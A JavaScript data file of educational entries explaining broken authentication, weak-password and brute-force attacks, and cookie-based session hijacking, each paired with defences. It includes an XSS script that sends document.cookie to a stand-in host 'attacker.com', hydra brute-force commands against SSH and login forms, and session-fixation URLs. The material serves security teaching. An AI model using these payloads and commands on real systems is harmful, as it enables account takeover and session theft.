allVulnerabilities.push(
{
    "id": 18,
    "title": "Broken Authentication Vulnerability",
    "summary": `
        <p><b>Broken Authentication</b> is a critical web application vulnerability that occurs when authentication mechanisms are implemented incorrectly, allowing attackers to compromise user accounts, bypass login systems, or gain unauthorized access.</p>

        <p>This vulnerability is one of the most dangerous security issues because authentication systems protect sensitive accounts, administrative panels, and confidential user data.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when authentication processes are weak, improperly configured, or fail to securely validate user identities.</p>

        <h3>Common Authentication Weaknesses:</h3>

        <pre><code>Weak passwords

Predictable session tokens

Missing rate limiting

Improper session management

Insecure password reset mechanisms</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// Weak Login Logic

if(username == "admin" && password == "admin") {
    login();
}</code></pre>

        <p>The application uses insecure and predictable credentials.</p>

        <h3>Brute Force Attack Example:</h3>

        <pre><code>admin:admin
admin:password
admin:123456</code></pre>

        <p>Attackers attempt multiple username and password combinations until successful authentication occurs.</p>

        <h3>Credential Stuffing Attack:</h3>

        <p>Attackers use leaked usernames and passwords obtained from previous data breaches.</p>

        <pre><code>user@example.com : password123</code></pre>

        <h3>Session Hijacking:</h3>

        <pre><code>Cookie: PHPSESSID=abc123</code></pre>

        <p>If attackers steal valid session cookies, they may impersonate authenticated users.</p>

        <h3>Why is Broken Authentication Dangerous?</h3>

        <p>Successful exploitation may allow attackers to access sensitive accounts, steal confidential information, escalate privileges, or fully compromise the application.</p>

        <h3>Common Authentication Attacks:</h3>

        <p>1. Brute Force Attacks.</p>
        <p>2. Credential Stuffing.</p>
        <p>3. Session Hijacking.</p>
        <p>4. Password Spraying.</p>
        <p>5. Session Fixation.</p>

        <h3>Password Spraying Example:</h3>

        <pre><code>Password2024!
Welcome123
Company@123</code></pre>

        <p>Attackers try common passwords against many accounts to avoid lockout mechanisms.</p>

        <h3>Weak Session Token Example:</h3>

        <pre><code>SESSIONID=1001
SESSIONID=1002
SESSIONID=1003</code></pre>

        <p>Predictable session identifiers allow attackers to guess active sessions.</p>

        <h3>Insecure Password Reset Example:</h3>

        <pre><code>http://target.com/reset?token=12345</code></pre>

        <p>Weak reset tokens may allow attackers to reset user passwords.</p>

        <h3>Missing Rate Limiting:</h3>

        <p>If the application does not restrict repeated login attempts, attackers can automate brute force attacks.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-site.com

username=admin&password=admin</code></pre>

        <h3>Indicators of Broken Authentication:</h3>

        <p>1. Weak password policies.</p>
        <p>2. Predictable session IDs.</p>
        <p>3. Missing account lockout.</p>
        <p>4. Insecure password reset functionality.</p>
        <p>5. Session tokens exposed in URLs.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Login forms

Password reset systems

Session management

Remember-me functionality

Single Sign-On systems</code></pre>

        <h3>Session Fixation Example:</h3>

        <pre><code>http://target.com/login?SESSIONID=attacker123</code></pre>

        <p>The attacker forces the victim to use a known session identifier.</p>

        <h3>Multi-Factor Authentication Bypass:</h3>

        <p>Weak MFA implementations may allow attackers to bypass additional authentication layers.</p>

        <h3>Example of Safe Authentication:</h3>

        <pre><code>// Secure Authentication

Use strong password hashing

Generate random session tokens

Enable MFA

Apply account lockout</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Enforce strong password policies.</b></p>

        <p><b>2. Use Multi-Factor Authentication (MFA).</b></p>

        <p><b>3. Implement account lockout and rate limiting.</b></p>

        <p><b>4. Use secure random session identifiers.</b></p>

        <p><b>5. Invalidate sessions after logout.</b></p>

        <p><b>6. Protect cookies using HttpOnly and Secure flags.</b></p>

        <p><b>7. Use strong password hashing algorithms such as bcrypt or Argon2.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Monitor failed login attempts

Apply CAPTCHA mechanisms

Use secure session storage

Enable login alerts

Monitor suspicious authentication activity</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Hydra
Medusa
Nuclei</code></pre>

        <h3>Difference Between Authentication and Authorization:</h3>

        <p><b>Authentication:</b> Verifies the identity of the user.</p>

        <p><b>Authorization:</b> Determines what the authenticated user is allowed to access.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may take over accounts, access administrative panels, steal sensitive information, perform fraudulent actions, or compromise entire applications.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Broken Authentication is considered extremely critical because compromised authentication mechanisms directly expose user accounts and sensitive systems to unauthorized access.</p>
    `
},


{
    "id": 19,
    "title": "Weak Password Attack",
    "summary": `
        <p><b>Weak Password Attack</b> is a common security attack in which attackers exploit weak, predictable, or reused passwords to gain unauthorized access to user accounts, systems, or applications.</p>

        <p>This attack is highly successful because many users continue to use simple passwords, common words, keyboard patterns, or reused credentials across multiple platforms.</p>

        <h3>How Does the Attack Occur?</h3>

        <p>The attack occurs when attackers attempt to authenticate using passwords that are easy to guess or commonly used.</p>

        <h3>Common Weak Password Examples:</h3>

        <pre><code>123456
password
admin
qwerty
welcome123</code></pre>

        <h3>Why are Weak Passwords Dangerous?</h3>

        <p>Weak passwords allow attackers to compromise accounts quickly using automated tools, brute force attacks, or credential stuffing techniques.</p>

        <h3>Common Weak Password Patterns:</h3>

        <pre><code>Simple numbers

Dictionary words

Keyboard sequences

Personal information

Repeated passwords</code></pre>

        <h3>Simple Brute Force Example:</h3>

        <pre><code>admin:123456
admin:password
admin:qwerty</code></pre>

        <p>The attacker repeatedly tries common passwords until authentication succeeds.</p>

        <h3>Credential Stuffing Example:</h3>

        <p>Attackers use leaked username and password combinations from previous data breaches.</p>

        <pre><code>user@example.com : Password123</code></pre>

        <h3>Password Spraying Attack:</h3>

        <pre><code>Spring2024!
Welcome123
Company@123</code></pre>

        <p>Attackers try a few common passwords against many accounts to avoid triggering account lockouts.</p>

        <h3>Dictionary Attack:</h3>

        <p>Attackers use large wordlists containing common passwords and variations.</p>

        <pre><code>rockyou.txt</code></pre>

        <h3>Hybrid Password Attack:</h3>

        <pre><code>password123
admin2024
welcome@1</code></pre>

        <p>The attacker combines dictionary words with numbers or symbols.</p>

        <h3>Why is the Attack Effective?</h3>

        <p>Many users select passwords that are short, predictable, reused, or based on personal information.</p>

        <h3>Common Attack Targets:</h3>

        <pre><code>Email accounts

Admin panels

VPN logins

Cloud services

Social media accounts</code></pre>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-site.com

username=admin&password=123456</code></pre>

        <h3>Automated Password Attack Tools:</h3>

        <pre><code>Hydra
Medusa
Burp Suite Intruder
John the Ripper
Hashcat</code></pre>

        <h3>Indicators of Weak Password Vulnerabilities:</h3>

        <p>1. No password complexity requirements.</p>
        <p>2. Missing account lockout mechanisms.</p>
        <p>3. Lack of Multi-Factor Authentication (MFA).</p>
        <p>4. Common passwords accepted by the system.</p>
        <p>5. Unlimited login attempts.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Account takeover.</p>
        <p>2. Unauthorized system access.</p>
        <p>3. Data theft.</p>
        <p>4. Privilege escalation.</p>
        <p>5. Lateral movement inside networks.</p>

        <h3>Weak Password Policy Example:</h3>

        <pre><code>Password length: 4 characters

No uppercase requirement

No special characters

No password expiration</code></pre>

        <h3>Strong Password Example:</h3>

        <pre><code>T9#vL2@pQ7!x</code></pre>

        <p>Strong passwords are long, random, and difficult to predict.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Enforce strong password complexity policies.</b></p>

        <p><b>2. Require long passwords.</b></p>

        <p><b>3. Enable Multi-Factor Authentication (MFA).</b></p>

        <p><b>4. Prevent password reuse.</b></p>

        <p><b>5. Apply account lockout mechanisms.</b></p>

        <p><b>6. Implement rate limiting for login attempts.</b></p>

        <p><b>7. Monitor suspicious authentication activity.</b></p>

        <h3>Password Storage Security:</h3>

        <pre><code>bcrypt
Argon2
PBKDF2</code></pre>

        <p>Applications should store passwords using strong hashing algorithms.</p>

        <h3>Common Security Best Practices:</h3>

        <pre><code>Use password managers

Enable MFA

Monitor breach databases

Train users about password security

Apply login alerts</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Hydra
Medusa
John the Ripper
Hashcat
Burp Suite</code></pre>

        <h3>Difference Between Brute Force and Password Spraying:</h3>

        <p><b>Brute Force:</b> Tries many passwords against one account.</p>

        <p><b>Password Spraying:</b> Tries one common password against many accounts.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may steal accounts, access sensitive systems, compromise internal networks, deploy malware, or perform fraudulent activities using compromised credentials.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Weak Password vulnerabilities are considered highly critical because compromised credentials often provide direct access to sensitive accounts, systems, and confidential information.</p>
    `
},


{
    "id": 20,
    "title": "Brute Force Login Attack",
    "summary": `
        <p><b>Brute Force Login Attack</b> is a common authentication attack in which attackers repeatedly attempt different username and password combinations until valid credentials are discovered.</p>

        <p>This attack targets login systems with weak authentication protections, missing rate limiting, or weak password policies.</p>

        <h3>How Does the Attack Occur?</h3>

        <p>The attacker automates repeated login attempts against a target authentication system.</p>

        <h3>Common Attack Targets:</h3>

        <pre><code>Admin panels

Email accounts

VPN portals

SSH services

Web applications</code></pre>

        <h3>Simple Brute Force Example:</h3>

        <pre><code>admin:admin
admin:123456
admin:password
admin:qwerty</code></pre>

        <p>The attacker continuously tries different password combinations until authentication succeeds.</p>

        <h3>Why is Brute Force Dangerous?</h3>

        <p>Successful brute force attacks may lead to account takeover, unauthorized access, data theft, privilege escalation, or full system compromise.</p>

        <h3>Types of Brute Force Attacks:</h3>

        <p>1. Traditional Brute Force.</p>
        <p>2. Dictionary Attack.</p>
        <p>3. Credential Stuffing.</p>
        <p>4. Password Spraying.</p>
        <p>5. Hybrid Attacks.</p>

        <h3>Dictionary Attack Example:</h3>

        <pre><code>password
welcome123
letmein
admin123</code></pre>

        <p>The attacker uses wordlists containing common passwords.</p>

        <h3>Credential Stuffing Example:</h3>

        <pre><code>user@example.com : Password123</code></pre>

        <p>Attackers reuse leaked credentials from previous breaches.</p>

        <h3>Password Spraying Example:</h3>

        <pre><code>Company2024!
Welcome123
Spring2024!</code></pre>

        <p>Attackers try a few common passwords against many accounts to avoid detection.</p>

        <h3>Hybrid Attack Example:</h3>

        <pre><code>admin2024
password@1
welcome123!</code></pre>

        <p>The attacker combines dictionary words with numbers and symbols.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-site.com

username=admin&password=123456</code></pre>

        <h3>Automated Brute Force Tools:</h3>

        <pre><code>Hydra
Medusa
Burp Suite Intruder
Patator
Ncrack</code></pre>

        <h3>Indicators of Brute Force Vulnerabilities:</h3>

        <p>1. Missing account lockout mechanisms.</p>
        <p>2. Unlimited login attempts.</p>
        <p>3. Weak password policies.</p>
        <p>4. Missing CAPTCHA protection.</p>
        <p>5. Lack of Multi-Factor Authentication (MFA).</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Account takeover.</p>
        <p>2. Administrative access.</p>
        <p>3. Data theft.</p>
        <p>4. Privilege escalation.</p>
        <p>5. Internal network access.</p>

        <h3>Brute Force Against SSH:</h3>

        <pre><code>hydra -l root -P passwords.txt ssh://target.com</code></pre>

        <p>Attackers often target exposed SSH services using automated tools.</p>

        <h3>Brute Force Against Web Login Forms:</h3>

        <pre><code>hydra -L users.txt -P passwords.txt target.com http-post-form</code></pre>

        <h3>Common Weak Password Examples:</h3>

        <pre><code>123456
password
admin
qwerty
welcome123</code></pre>

        <h3>Safe Authentication Example:</h3>

        <pre><code>// Secure Authentication Controls

Enable account lockout

Apply rate limiting

Use MFA

Require strong passwords</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Implement account lockout mechanisms.</b></p>

        <p><b>2. Apply rate limiting on login attempts.</b></p>

        <p><b>3. Use CAPTCHA systems.</b></p>

        <p><b>4. Enforce strong password policies.</b></p>

        <p><b>5. Enable Multi-Factor Authentication (MFA).</b></p>

        <p><b>6. Monitor suspicious login activity.</b></p>

        <p><b>7. Alert users about unusual login attempts.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict login endpoints

Monitor authentication logs

Block suspicious IP addresses

Use Web Application Firewall (WAF)

Enable login anomaly detection</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Hydra
Medusa
Burp Suite
Ncrack
OWASP ZAP</code></pre>

        <h3>Difference Between Brute Force and Credential Stuffing:</h3>

        <p><b>Brute Force:</b> Attempts many password combinations against accounts.</p>

        <p><b>Credential Stuffing:</b> Uses previously leaked valid credentials.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may compromise sensitive accounts, steal confidential data, gain administrative access, deploy malware, or pivot deeper into internal systems.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Brute Force Login vulnerabilities are considered highly critical because weak authentication protections may directly expose sensitive user and administrative accounts.</p>
    `
},


{
    "id": 21,
    "title": "Session Hijacking Using Cookies",
    "summary": `
        <p><b>Session Hijacking Using Cookies</b> is a critical attack in which attackers steal or manipulate session cookies to impersonate authenticated users and gain unauthorized access to web applications.</p>

        <p>Web applications commonly use cookies to maintain authenticated sessions. If attackers obtain valid session cookies, they may bypass the login process entirely.</p>

        <h3>How Does the Attack Occur?</h3>

        <p>The attack occurs when attackers steal, predict, intercept, or manipulate authentication cookies used by the application.</p>

        <h3>What are Session Cookies?</h3>

        <p>Session cookies are identifiers stored inside the browser that allow the server to recognize authenticated users.</p>

        <pre><code>Cookie: PHPSESSID=abc123xyz</code></pre>

        <h3>Why are Session Cookies Important?</h3>

        <p>Whoever owns a valid session cookie may gain access to the victim's authenticated account without knowing the password.</p>

        <h3>Common Methods of Cookie Theft:</h3>

        <p>1. Cross Site Scripting (XSS).</p>
        <p>2. Packet sniffing on insecure HTTP connections.</p>
        <p>3. Malware or browser compromise.</p>
        <p>4. Session fixation attacks.</p>
        <p>5. Predictable session identifiers.</p>

        <h3>Cookie Theft Using XSS:</h3>

        <pre><code>&lt;script&gt;
fetch('http://attacker.com/steal?cookie=' + document.cookie)
&lt;/script&gt;</code></pre>

        <p>If cookies are not protected with the HttpOnly flag, attackers may steal them through JavaScript.</p>

        <h3>Using the Stolen Cookie:</h3>

        <pre><code>Cookie: PHPSESSID=abc123xyz</code></pre>

        <p>The attacker inserts the stolen cookie into their browser or HTTP requests.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /dashboard HTTP/1.1
Host: vulnerable-site.com
Cookie: PHPSESSID=abc123xyz</code></pre>

        <h3>Session Fixation Attack:</h3>

        <pre><code>http://target.com/login?SESSIONID=attacker123</code></pre>

        <p>The attacker forces the victim to authenticate using a known session identifier.</p>

        <h3>Predictable Session IDs:</h3>

        <pre><code>SESSIONID=1001
SESSIONID=1002
SESSIONID=1003</code></pre>

        <p>Weak or sequential session IDs may allow attackers to guess active sessions.</p>

        <h3>Packet Sniffing Example:</h3>

        <p>If the application uses HTTP instead of HTTPS, attackers may intercept cookies over the network.</p>

        <pre><code>Cookie: SESSIONID=user123</code></pre>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Account takeover.</p>
        <p>2. Administrative access.</p>
        <p>3. Access to sensitive data.</p>
        <p>4. Fraudulent actions using victim accounts.</p>
        <p>5. Privilege escalation.</p>

        <h3>Indicators of Session Hijacking Vulnerabilities:</h3>

        <p>1. Cookies missing HttpOnly flag.</p>
        <p>2. Cookies missing Secure flag.</p>
        <p>3. Predictable session identifiers.</p>
        <p>4. Session IDs exposed in URLs.</p>
        <p>5. Sessions not invalidated after logout.</p>

        <h3>Weak Cookie Example:</h3>

        <pre><code>Set-Cookie: SESSIONID=12345</code></pre>

        <p>The session identifier is short and predictable.</p>

        <h3>Secure Cookie Example:</h3>

        <pre><code>Set-Cookie: SESSIONID=random_secure_token;
HttpOnly;
Secure;
SameSite=Strict</code></pre>

        <p>The cookie uses strong security protections.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Login systems

Admin panels

Banking applications

E-commerce websites

Cloud dashboards</code></pre>

        <h3>Session Replay Attack:</h3>

        <p>Attackers reuse stolen cookies to replay authenticated requests.</p>

        <h3>Example of Safe Session Management:</h3>

        <pre><code>// Secure Session Controls

Use random session IDs

Regenerate sessions after login

Expire sessions automatically

Protect cookies with security flags</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use HTTPS for all authenticated traffic.</b></p>

        <p><b>2. Enable HttpOnly cookies.</b></p>

        <p><b>3. Enable Secure cookies.</b></p>

        <p><b>4. Use SameSite cookie protection.</b></p>

        <p><b>5. Generate long random session identifiers.</b></p>

        <p><b>6. Regenerate sessions after login.</b></p>

        <p><b>7. Expire sessions after inactivity or logout.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Monitor session anomalies

Detect unusual IP changes

Apply Web Application Firewall (WAF)

Enable login alerts

Monitor suspicious session reuse</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Wireshark
Ettercap
Nuclei</code></pre>

        <h3>Difference Between Session Hijacking and Session Fixation:</h3>

        <p><b>Session Hijacking:</b> The attacker steals an existing authenticated session.</p>

        <p><b>Session Fixation:</b> The attacker forces the victim to use a session controlled by the attacker.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may bypass authentication completely, steal confidential information, perform actions as legitimate users, compromise administrative accounts, or conduct financial fraud.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Session Hijacking vulnerabilities are considered extremely critical because stolen session cookies may provide immediate unauthorized access to authenticated accounts without requiring passwords.</p>
    `
},
);
